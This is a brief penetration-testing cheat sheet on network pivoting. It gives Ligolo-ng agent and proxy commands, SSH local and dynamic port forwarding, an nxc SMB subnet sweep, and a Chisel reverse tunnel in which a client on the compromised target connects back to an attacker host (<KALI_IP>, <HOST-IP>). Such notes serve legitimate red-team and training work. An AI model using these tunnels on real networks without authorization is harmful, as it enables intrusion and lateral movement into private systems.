
# Pivoting with Ligolo-ng

## Start Proxy

```sh
sudo ligolo-proxy -selfcert
```

## Transfer the Agent

Transfer the `agent.exe` to target

```sh
.\agent.exe -connect <HOST-IP>:11601 -ignore-cert
```

## On Host

```sh
ligolo-ng >> session
? Specify a session : 1

ligolo-ng >> help

# autorote -> setup everything for you
ligolo-ng >> autoroute
# select the internal network you want to access here

# Then select the Create a new interface
? Create a new interface

# Start the tunnel
? Start the tunnel? Yes
```

## Find Hosts

```sh
nxc smb 10.0.2.0/24 # The new subnet you've access to
```

# Double Pivoting with Ligolo-ng


# SSH
## Single Port Forwarding

```sh
ssh -L 1234:localhost:3306 username@IP
```

# Dynamic Port Forwarding

```sh
ssh -D 9050 username@IP
```

# Routing Table

```sh
netstat -r
```

# Chisel

# Start

```bash
chisel server -p 9999 --reverse
```

# Agent

```bash
.\chisel.exe client <KALI_IP>:9999 R:8888:127.0.0.1:8888
```

8888 -> the port we want to be able to access
